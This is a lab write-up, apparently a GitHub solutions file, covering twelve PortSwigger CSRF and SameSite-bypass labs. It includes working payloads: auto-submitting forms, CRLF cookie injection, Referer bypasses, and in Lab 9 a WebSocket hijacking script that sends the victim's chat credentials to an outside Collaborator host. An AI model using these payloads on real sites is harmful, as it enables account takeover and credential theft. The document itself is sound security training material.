# Cross Site Request Forgery (CSRF)

## Lab 1: CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

Login with the credentials `wiener:peter` and update the email by giving new email in email box.

Find the request in the `HTTP history` of proxy.

Click `Go to exploit server` in the lab window.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/63f4ed20-c2f3-49bc-9b7d-196de1dc4761)

In body section, give following HTML code:

      <form method="POST" action="https://0a03006704daa24e806f67c500b50039.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="wiener%40web-security-academy.net">
    </form>
    <script>
        document.forms[0].submit();
    </script>

* Right-click on the request and select `Engagement tools -> Generate CSRF PoC`. Enable the option to include an `auto-submit script` and click `Regenerate`.
* Copy the HTML code and paste it into the exploit server body code.
* Change the email parameter value.
* Deliver it to the victim.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a0cfa7ea-e6c1-47ae-a2cf-98a1b7320d09)

* Thus, the lab is solved.

## Lab 2: CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Login with the credentials `wiener:peter` and update the email by giving new email in email box.
* Find the request in the `HTTP history` of proxy.
* Send the request to Burp Repeater and observe that if you change the value of the `csrf` parameter then the request is rejected.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9da1a36f-073b-470d-9d65-ce89eda421fe)

* Use `Change request method` on the context menu to convert it into a `GET` request and observe that the CSRF token is no longer verified.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/adab6b53-a37c-4ffa-abc3-fe8a0ca9bce8)

* Right-click on the request, and from the context menu select `Engagement tools -> Generate CSRF PoC`. Enable the option to include an auto-submit script and click `Regenerate`.
* Copy the HTML code and paste it into the exploit server body code.
* Change the email parameter value.
* Deliver it to the victim.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a0cfa7ea-e6c1-47ae-a2cf-98a1b7320d09)

* Thus, the lab is solved.

## Lab 3: CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### Sol :

* Login with the credentials `wiener:peter` and update the email by giving new email in email box.
* Find the request in the `HTTP history` of proxy.
* Delete the `csrf` parameter entirely and observe that the request is now accepted

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8cb5f0ad-9fde-4f6d-ad1c-7903c83ac661)

* Right-click on the request, and from the context menu select `Engagement tools -> Generate CSRF PoC`. Enable the option to include an auto-submit script and click `Regenerate`
* Copy the HTML code and paste it into the exploit server body code.
* Change the email parameter value.
* Deliver it to the victim.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a0cfa7ea-e6c1-47ae-a2cf-98a1b7320d09)

* Thus, the lab is solved.

## Lab 4: CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

`wiener:peter`

`carlos:montoya`

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
* Make a note of the value of the CSRF token, then drop the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0f190bd3-cc5f-43f3-96e6-ee10fb0df9d0)

* Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5ffe4e23-f84c-4e84-83c9-1c34cfc17c0c)

* Observe that if we swap the CSRF token with the value from the other account, then the request is accepted.
* Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
* Change the email parameter value.
* Deliver it to the victim.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9d6956f4-e465-4ab7-99d1-4c09614f68fc)

* Thus, the lab is solved.

## Lab 5: CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

`wiener:peter`

`carlos:montoya`

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e4789ed9-928b-4b9f-8b4e-fd5e0786003b)

* Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
* Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater
* Observe that if we swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
  
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9cfe0cb0-da00-46bc-a31e-d6ee3e8e6659)

* Close the Repeater tab and incognito browser.
* Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
* Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request
* Remove the auto-submit <script> block, and instead add the following code to inject the cookie by replacing the Lab ID and CSRF Key

      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/be8a3130-1a69-4a03-b3b3-083454c202f4)

* Change the email address in your exploit so that it doesn't match your own.
* Store the exploit, then click `Deliver to victim` to solve the lab.

## Lab 6: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history
* Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.
  
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a30fc854-f006-4cd8-b6b8-5f888169534b)

* Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7bf18124-03f4-437f-b241-933bb133a53a)

* Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
* Remove the auto-submit `<script>` block and instead add the following code to inject the cookie and submit the form

      <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/b87a8f73-388b-412f-abf3-9bd5bec8c221)

* Change the email address in your exploit so that it doesn't match your own.
* Make sure that `csrf` value given as `fake`
* Store the exploit, then click `Deliver to victim` to solve the lab.
* Thus, the lab is solved.

## Lab 7: SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history
* In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent `GET` request.
* Try overriding the method by adding the _method parameter to the query string:

      GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1

* Send the request. Observe that this seems to have been accepted by the server.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/ac0c7164-b8ff-4c6b-85a6-25a919213363)

* Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability 

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1255abfb-4ed8-459f-8006-9b1584072c1f)

* Store and view the exploit yourself. Confirm that this has successfully changed your email address on the target site.
* Deliver the exploit to the victim.
* Thus, the lab is solved.

## Lab 8: SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history
* Try injecting a path traversal sequence so that the dynamically constructed redirect URL will point to your account page:

      /post/comment/confirmation?postId=1/../../my-account

* Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the `postId` parameter to elicit a `GET` request for an arbitrary endpoint on the target site.
* Send the POST /my-account/change-email request to Burp Repeater.
* In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.
* Give the below payload to the exploit server

      <script>
          document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
      </script>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/11d2dbec-bce4-4fc8-b446-63d88a9dfaae)

* Thus, the lab is solved.

## Lab 9: SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

### Sol :

* In Burp's browser, go to the live chat feature and send a few messages.
* In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/2da85414-785a-498d-acf4-fd9f824a5452)

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d604206a-3d43-4400-bf16-ed91d9d01956)

* Go to the exploit server and give the below payload:

      <script>
          var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
          ws.onopen = function() {
        ws.send("READY");
          };
          ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
          };
      </script>
* Deliver it to the vitim
* Check the Burp Collaborator response.
* Give the above payload to the `Decoder` and encode it into URL.
  
![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5946e8d7-19d8-4af0-9ad6-6cab1bf459ee)

* Give the encoded URL as input to the below payload.

      <script>
          document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
      </script>

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/4b9af243-3b48-44d2-8674-2d8695954764)

* See the response at the Burp Collaborator

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/854c2b03-5e82-41af-a122-a35965d7858b)

* We got the password for the user carlos
* Login with the password and lab is solved.

## Lab 10: SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

### Sol :

* Login with the given credentials and it redirects to the social page and continue to login.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/56d23783-99dc-4925-aeb1-4af3f24442d4)

* Update the email and send it to repeater and generate the CSRF PoC

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/130d191c-1ac9-4c85-9dd0-80ebd13f1df9)

* Go to exploit server
* Give the below payload

      <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
          <input type="hidden" name="email" value="pwned@portswigger.net">
      </form>
      <p>Click anywhere on the page</p>
      <script>
          window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
          }

          function changeEmail() {
        document.forms[0].submit();
          }
      </script>

* Deliver it to the victim

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7a62c948-9bd4-48dd-9f18-a9cd7728929d)

* Thus, the lab is solved.

## Lab 11: CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
* Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/68117485-17bf-4051-a4db-49df61bdbbfc)

* Delete the Referer header entirely and observe that the request is now accepted

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9b46bb25-db83-4888-a36e-c01dc594c6c6)

* Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:

      <meta name="referrer" content="no-referrer">

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a4eb7a7c-c250-4d37-8740-21330977c19b)

* Deliver it to the victim and lab is solved.

## Lab 12: CSRF with broken Referer validation

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

* Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
* Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/68117485-17bf-4051-a4db-49df61bdbbfc)

* Give the below payload as Referer parameter value.

      Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/48588b6f-4eaa-4e3c-af7b-bd60a0f43eb8)

* Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
* Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:

      history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

* This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
* If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

        Referrer-Policy: unsafe-url

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/6628727d-c597-44fa-a978-9685980eab8d)

* Thus, the lab is solved.
